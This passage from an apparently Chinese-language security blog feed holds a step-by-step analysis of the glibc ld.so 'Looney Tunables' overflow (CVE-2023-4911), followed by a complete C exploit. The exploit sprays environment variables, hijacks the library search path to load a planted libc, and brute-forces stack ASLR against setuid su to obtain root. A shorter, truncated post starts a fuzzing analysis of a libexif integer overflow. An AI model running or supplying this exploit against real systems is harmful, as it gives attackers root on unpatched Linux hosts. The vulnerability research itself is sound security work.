the</span></span><br><span class="line"><span class="comment"> colon.  */</span></span><br><span class="line">      <span class="keyword">if</span> (p[len]== <span class="string">':'</span>)</span><br><span class="line">{</span><br><span class="line">  p += len + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">      p += len + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Take the value from the valstring since we need to NULL terminate it.  */</span></span><br><span class="line">      <span class="type">char</span> *value = &amp;valstring[p - tunestr];</span><br><span class="line">      len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (p[len] != <span class="string">':'</span> &amp;&amp; p[len] != <span class="string">'\0'</span>)</span><br><span class="line">len++;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Add the tunable if it exists.  */</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span> (tunable_list) / <span class="keyword">sizeof</span> (<span class="type">tunable_t</span>); i++)</span><br><span class="line">{</span><br><span class="line">  <span class="type">tunable_t</span> *cur = &amp;tunable_list[i];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tunable_is_name (cur-&gt;name, name))</span><br><span class="line">    {</span><br><span class="line">      <span class="comment">/* If we are in a secure context (AT_SECURE) then ignore the</span></span><br><span class="line"><span class="comment"> tunable unless it is explicitly marked as secure.  Tunable</span></span><br><span class="line"><span class="comment"> values take precedence over their envvar aliases.  We write</span></span><br><span class="line"><span class="comment"> the tunables that are not SXID_ERASE back to TUNESTR, thus</span></span><br><span class="line"><span class="comment"> dropping all SXID_ERASE tunables and any invalid or</span></span><br><span class="line"><span class="comment"> unrecognized tunables.  */</span></span><br><span class="line">      <span class="keyword">if</span> (__libc_enable_secure)</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span> (cur-&gt;security_level != TUNABLE_SECLEVEL_SXID_ERASE)</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> (off &gt; <span class="number">0</span>)</span><br><span class="line">tunestr[off++] = <span class="string">':'</span>;</span><br><span class="line"></span><br><span class="line">      <span class="type">const</span> <span class="type">char</span> *n = cur-&gt;name;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (*n != <span class="string">'\0'</span>)</span><br><span class="line">tunestr[off++] = *n++;</span><br><span class="line"></span><br><span class="line">      tunestr[off++] = <span class="string">'='</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; len; j++)</span><br><span class="line">tunestr[off++] = value[j];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cur-&gt;security_level != TUNABLE_SECLEVEL_NONE)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">      value[len] = <span class="string">'\0'</span>;</span><br><span class="line">      tunable_initialize (cur, value);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (p[len] != <span class="string">'\0'</span>)</span><br><span class="line">p += len + <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然而最后的默认逻辑是可以被打破的,如果在下一次循环扫描到结束符’\0’之前扫描到了新的’=’符号,则会将上一次的值作为键,继续处理.例如: GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A .</p><blockquote><p><code>否则不改变p的位置</code>,进入下一次循环.(<code>默认逻辑是在下一次循环中,p会从本次tunable的值开始扫描直到扫到结束符'\0',结束处理</code>.)</p></blockquote><p>处理该tunable的逻辑如下,下图是每一轮开始时的情况,红色部分为本次tunable的键,蓝色部分为本次tunable的值.<br>在第三轮中,会从valString中越界取出字符作为键写入,这里假设越界取出的字符是’\0’.<br>第四轮中,tunable的键和值符合正常的tunable.<br>在第五轮进入时,由于当前键为之前越界取出的’\0’,循环终止,结束处理.</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403151839118.png"></p><p>在parse_tunables最后下个断点,验证了我们的推理(注意’\0’截断).<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403151622443.png"></p><p>循环能否终止,要取决于越界取时是否能取到一个终止符,否则将无限循环.<br>这也解释了官方POC中”Z=<code>printf '%08192x' 1</code>“的作用,使得一直取不到结束符’\0’,持续循环直到越界到超出栈的下界.</p><blockquote><p>env -i “GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A” “Z=<code>printf '%08192x' 1</code>“ /usr/bin/su –help</p></blockquote><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><h3 id="无效的溢出"><a href="#无效的溢出" class="headerlink" title="无效的溢出"></a>无效的溢出</h3><p>然而在我的环境中,valString距离栈下界只有0x3e的距离,使得仅仅是GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A就会导致在parse_tunables中超出栈的下界而崩溃.调试时手动调用mmap扩大栈空间后,成功从parse_tunables中返回并来到另一个崩溃点.</p><p>但用gdb强行开空间肯定不行,多次尝试后发现在该环境变量后添加大量空的环境变量可以使得valString的位置向低地址移动,从而避免越界读取时超出栈的下界.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403151620242.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403151621270.png"></p><p>先忽略掉这个新的崩溃点(虽然它很重要),现在我们能安全的控制溢出,下一步是搜寻溢出的对象.<br>堆溢出一般两种选择,一是打堆分配器使用的堆块元信息,二是覆盖后面的对象.<br>根据之前的分析,该堆分配器并没有在堆块上保存任何的元信息,pass.<br>那就只能覆盖后面的对象,但由于该堆分配器是向高地址增长的且(几乎)不提供释放的功能,导致tunestr之后是未使用的空间,根本不存在对象.</p><p>似乎已经走投无路了,但其实还有一线生机.该分配器其实并不完全是向高地址增长的,因为新的内存池是通过mmap分配的,而多次mmap分配的空间是向低地址增长的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403152241142.png"></p><p>正好ld的只读段和读写段之间有1页的内存,获取到这一页就意味着可以控制ld上大量的数据.<br>然而天有绝人之路,该分配器每次最少分配两页,这一页是拿不到的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403152246393.png"></p><p>于是现在的能力是,第二次mmap出的tunestr溢出覆盖掉第一次mmap出的tunestr,哈哈,有什么用呢.(其实有点用,可以改掉第一次经过合法化后的tunestr,可能能达到某些效果).</p><h3 id="幸运的崩溃"><a href="#幸运的崩溃" class="headerlink" title="幸运的崩溃"></a>幸运的崩溃</h3><p>挖洞是需要缘分的,没想到利用也有这一说法.</p><p>现在来分析一下之前找到的那个崩溃点,可以发现,一个link_map的指针l的值被我们污染了.<br>不可思议,因为溢出点之后没有任何已创建的对象.联系上最近出的一道堆题,唯一的解释是,还有一个未初始化漏洞.</p><p>能看出来这是一个将link_map链入链表的操作,结合上源码中注释掉的new-&gt;l_next=NULL,大概能推出是崩溃之前的一个link_map对象的l-&gt;next字段被我们污染,这里又去掉了对l-&gt;next指针的初始化操作,导致不存在的link_map一并链入了namespace中.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403151615351.png"></p><p>但注释说了这是calloc,怎么会拿到被提前污染的指针呢?看一眼源码,哈哈,幽默.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We use this function occasionally since the real implementation may</span></span><br><span class="line"><span class="comment">   be optimized when it can assume the memory it returns already is</span></span><br><span class="line"><span class="comment">   set to NUL.  */</span></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line">__minimal_calloc (<span class="type">size_t</span> nmemb, <span class="type">size_t</span> size)</span><br><span class="line">{</span><br><span class="line">  <span class="comment">/* New memory from the trivial malloc above is always already cleared.</span></span><br><span class="line"><span class="comment">     (We make sure that's true in the rare occasion it might not be,</span></span><br><span class="line"><span class="comment">     by clearing memory in free, below.)  */</span></span><br><span class="line">  <span class="type">size_t</span> bytes = nmemb * size;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HALF_SIZE_T (((size_t) 1) &lt;&lt; (8 * sizeof (size_t) / 2))</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((nmemb | size) &gt;= HALF_SIZE_T, <span class="number">0</span>)</span><br><span class="line">      &amp;&amp; size != <span class="number">0</span> &amp;&amp; bytes / size != nmemb)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">malloc</span> (bytes);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">__typeof (<span class="built_in">calloc</span>) *__rtld_calloc attribute_relro;</span><br><span class="line">__typeof (<span class="built_in">free</span>) *__rtld_free attribute_relro;</span><br><span class="line">__typeof (<span class="built_in">malloc</span>) *__rtld_malloc attribute_relro;</span><br><span class="line">__typeof (<span class="built_in">realloc</span>) *__rtld_realloc attribute_relro;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__rtld_malloc_init_stubs (<span class="type">void</span>)</span><br><span class="line">{</span><br><span class="line">  __rtld_calloc = &amp;__minimal_calloc;</span><br><span class="line">  __rtld_free = &amp;__minimal_free;</span><br><span class="line">  __rtld_malloc = &amp;__minimal_malloc;</span><br><span class="line">  __rtld_realloc = &amp;__minimal_realloc;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>能用可控内容覆盖掉link_map,那肯定能做很多事了.一个未初始化的字段是l-&gt;l_inifo[RPATH],其指向了信任的加载库路径的Elf64_Dyn结构,覆盖其指向伪造的恶意路径,从而可以加载恶意libc,利用su程序的suid完成提权.</p><p>由于不知道栈的地址,惯用手法是使用环境变量在栈上喷射大量的恶意Elf64_Dyn,同时将l-&gt;l_inifo[RPATH]设置为栈随机化的中心位置,不断fork进程爆破.</p><p>最终成功劫持libc路径为"(当然不一定,官方说选这个是因为绝大部分系统的符号表-0x14位置处都有一个”符号).<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403171258580.png"></p><p>溢出偏移的计算可以参照上面那幅溢出的模式图,需要使用第四轮的越界读取进行覆盖,因为这样可以同时在覆盖到l_info[DT_RPATH]之前写入大量’\0’覆盖link_map的其他位置,不然会在处理过程中发生段错误.计算出大概的位置再细调一下.</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403171258577.png"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// No ASLR</span></span><br><span class="line"><span class="comment">//#define STACK_TARGET   0x00007ffffff0c808</span></span><br><span class="line"><span class="comment">// ASLR Brute</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACK_TARGET   0x00007ffdfffff018</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> * <span class="title function_">p64</span><span class="params">(<span class="type">uint64_t</span> val)</span> {</span><br><span class="line">    <span class="type">char</span> * ret = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memset</span>(ret, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ret, &amp;val, <span class="number">8</span>);</span><br><span class="line">    ret[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> *envp[<span class="number">0x1000</span>] = {<span class="literal">NULL</span>};</span><br><span class="line">    <span class="type">char</span> *argv[] = {<span class="string">"/usr/bin/su"</span>, <span class="string">"--help"</span>, <span class="literal">NULL</span>};</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建恶意路径,将提前准备的恶意libc加入.</span></span><br><span class="line">    <span class="keyword">if</span> (mkdir(<span class="string">"\""</span>, <span class="number">0755</span>) == <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="type">int</span> sfd, dfd, len;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">        dfd = open(<span class="string">"\"/libc.so.6"</span>, O_CREAT | O_WRONLY, <span class="number">0755</span>);</span><br><span class="line">        sfd = open(<span class="string">"./libc.so.6"</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        {</span><br><span class="line">            len = read(sfd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">            write(dfd, buf, len);</span><br><span class="line">        } <span class="keyword">while</span> (len == <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        close(sfd);</span><br><span class="line">        close(dfd);</span><br><span class="line">    } </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用尽LD读写段,使得payload使用新mmap新的空间</span></span><br><span class="line">    <span class="type">char</span> flat1[<span class="number">0xd00</span>];</span><br><span class="line">    <span class="built_in">memset</span>(flat1,<span class="number">0</span>,<span class="number">0xd00</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(flat1,<span class="string">"GLIBC_TUNABLES=glibc.malloc.mxfast="</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="built_in">strlen</span>(flat1);j &lt; <span class="number">0xd00</span><span class="number">-1</span>;++j)</span><br><span class="line">        flat1[j]=<span class="string">'F'</span>;</span><br><span class="line">    flat1[<span class="number">0xd00</span><span class="number">-1</span>] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// payload</span></span><br><span class="line">    <span class="type">char</span> payload[<span class="number">0x300</span>];</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,<span class="number">0x300</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(payload,<span class="string">"GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast="</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="built_in">strlen</span>(payload);j &lt; <span class="number">0x300</span> <span class="number">-1</span> ;++j)</span><br><span class="line">        payload[j]=<span class="string">'P'</span>;</span><br><span class="line">    payload[<span class="number">0x300</span> - <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//填充块,增大payload与link_map之间的距离,否则无法使得第四轮的越界读取内容写入link_map(计算一下偏移可知).</span></span><br><span class="line">    <span class="type">char</span> flat2[<span class="number">0x300</span>];</span><br><span class="line">    <span class="built_in">memset</span>(flat2,<span class="number">0</span>,<span class="number">0x300</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(flat2,<span class="string">"GLIBC_TUNABLES=glibc.malloc.mxfast="</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="built_in">strlen</span>(flat2);j &lt; <span class="number">0x300</span><span class="number">-1</span>;++j)</span><br><span class="line">        flat2[j]=<span class="string">'L'</span>;</span><br><span class="line">    flat2[<span class="number">0x300</span><span class="number">-1</span>] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">0x1000</span><span class="number">-1</span>;)</span><br><span class="line">        envp[i++] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    envp[i++] = flat1;</span><br><span class="line">    envp[i++] = payload;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0xFD</span>;</span><br><span class="line">    envp[i++] = p64(STACK_TARGET);</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0x500</span>;</span><br><span class="line">    envp[i++] = flat2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//喷射Elf64_Dyn</span></span><br><span class="line">    <span class="type">char</span> dt_rpath[<span class="number">0x9000</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(dt_rpath); i += <span class="number">8</span>)</span><br><span class="line">    {</span><br><span class="line">        *(<span class="type">uintptr_t</span> *)(dt_rpath + i) = <span class="number">-0x14</span>ULL;</span><br><span class="line">    }</span><br><span class="line">    dt_rpath[<span class="keyword">sizeof</span>(dt_rpath) - <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x2f</span>; i++)</span><br><span class="line">    {</span><br><span class="line">        envp[<span class="number">0xf80</span> + i] = dt_rpath;</span><br><span class="line">    }</span><br><span class="line">    envp[<span class="number">0xffe</span>] = <span class="string">"AAAA"</span>; <span class="comment">// alignment, currently already aligned</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//爆破栈的ASLR.</span></span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> ct = <span class="number">1</span>;; ct++)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (ct % <span class="number">100</span> == <span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"try %d\n"</span>, ct);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> ((pid = fork()) &lt; <span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            perror(<span class="string">"fork"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) <span class="comment">// child</span></span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, envp) &lt; <span class="number">0</span>)</span><br><span class="line">            {</span><br><span class="line">                perror(<span class="string">"execve"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">// parent</span></span><br><span class="line">        {</span><br><span class="line">            <span class="type">int</span> wstatus;</span><br><span class="line">            wait(&amp;wstatus);</span><br><span class="line">            <span class="keyword">if</span> (!WIFSIGNALED(wstatus))</span><br><span class="line">            {</span><br><span class="line">                <span class="comment">// probably returning from shell :)</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-4911">https://nvd.nist.gov/vuln/detail/CVE-2023-4911</a><br><a href="https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables-local-privilege-escalation-glibc-ld-so.txt">https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables-local-privilege-escalation-glibc-ld-so.txt</a><br><a href="https://n.ova.moe/blog/%E3%80%8CPWN%E3%80%8DCVE-2023-4911-%E5%A4%8D%E7%8E%B0">https://n.ova.moe/blog/%E3%80%8CPWN%E3%80%8DCVE-2023-4911-%E5%A4%8D%E7%8E%B0</a><br><a href="https://github.com/leesh3288/CVE-2023-4911/blob/main/exp.c">https://github.com/leesh3288/CVE-2023-4911/blob/main/exp.c</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> 应用层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2012-2836 CVE-2009-3895 libexif 整数溢出</title>
      <link href="/2024/Try%20Fuzzing%20-CVE-2012-2836%20CVE-2009-3895%20libexif%20Integer-Overflow/"/>
      <url>/2024/Try%20Fuzzing%20-CVE-2012-2836%20CVE-2009-3895%20libexif%20Integer-Overflow/</url>
      
        <content type="html"><![CDATA[<p>libexif-0.6.14.</p><h2 id="CVE-2012-2836"><a href="#CVE-2012-2836" class="headerlink" title="CVE-2012-2836"></a>CVE-2012-2836</h2><p>-s 123跑几分钟,出了13个crash,栈回溯分一下类,一共4种路径</p><h3 id="崩溃分析"><a href="#崩溃分析" class="headerlink" title="崩溃分析"></a>崩溃分析</h3><p>crash 0:<br>调用exif_data_load_data_thumbnail函数时size参数明显过大,且正好是unsigned int的最大值,猜测是个整数溢出或错误的类型转换(int32_t转uint32_t).</p><span id="more"></span><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403101050276.png"></p><p>崩溃指令可以看出是memmove时的越界读取,逻辑上符合size过大可能出现的情况.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403101057788.png"></p><p>crash 5:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403101050586.png"><br>崩溃的原因是从buf中取元素.<br>发现调用exif_get_short时参数buf是错误的地址,且与exif_data_load_data的d_orig地址非常相似,相差0xFFFFFFFF+3,同样让人联想到整数溢出类型的漏洞.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403101116353.png"></p><p>crash 8:<br>和crash0到达memmove的路径不同,其他相同.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403101050817.png"><br>crash 10:</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403101051016.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403101126771.png"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="Crash-0"><a href="#Crash-0" class="headerlink" title="Crash 0"></a>Crash 0</h4><p>跟着链子来到exif_data_load_data_thumbnail函数.众所周知,缓冲区溢出关注四个变量,destination大小,source大小,写入destination的偏移,读取source的偏移.如果指定了偏移,就意味着比较时的运算,有运算就有Integer Overflow的风险.<br>函数开始的Check中明显存在offset+size的上溢出问题,导致越界读取.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">exif_data_load_data_thumbnail</span> <span class="params">(ExifData *data, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *d,</span></span><br><span class="line"><span class="params">       <span class="type">unsigned</span> <span class="type">int</span> ds, ExifLong offset, ExifLong size)</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (ds &lt; offset + size) {</span><br><span class="line">exif_log (data-&gt;priv-&gt;<span class="built_in">log</span>, EXIF_LOG_CODE_DEBUG, <span class="string">"ExifData"</span>,</span><br><span class="line">  <span class="string">"Bogus thumbnail offset and size: %i &lt; %i + %i."</span>,</span><br><span class="line">  (<span class="type">int</span>) ds, (<span class="type">int</span>) offset, (<span class="type">int</span>) size);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (data-&gt;data) </span><br><span class="line">exif_mem_free (data-&gt;priv-&gt;mem, data-&gt;data);</span><br><span class="line">data-&gt;size = size;</span><br><span class="line">data-&gt;data = exif_data_alloc (data, data-&gt;size);</span><br><span class="line"><span class="keyword">if</span> (!data-&gt;data) </span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="built_in">memcpy</span> (data-&gt;data, d + offset, data-&gt;size);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>如何正确的Check overflow?引用《Secure Coding in C and C++》中的描述.</p><blockquote><p>Precondition.Addition of unsigned integers can result in an integer overflowif the sum of the left-hand side (LHS) and right-hand side (RHS) of an additionoperation is greater than UINT_MAXfor addition of inttype and ULLONG_MAXforaddition of unsignedlonglong type.<br>Addition of signed integers is more complicated, as shown in Table 5–5.As you test for these preconditions, make sure that the test itself does notoverflow. The tests in Table 5–5 are guaranteed not to overflow for appropri-ately signed values.</p><p>Postcondition.Another  solution  to  detecting  integer  overflow  is  to  performthe addition and then evaluate the results of the operation. For example, to testfor overflow of signed integers, let sum=lhs+rhs. If lhsis non-negative andsum&lt;rhs, an overflow has occurred. Similarly, if lhsis negative and sum&gt;rhs,an  overflow  has  occurred.  In  all  other  cases,  the  addition  operation  succeedswithout overflow. For unsigned integers, if the sum is smaller than either oper-and, an overflow has occurred.</p></blockquote><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403101356063.png"></p><p>官方的修补方案:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span 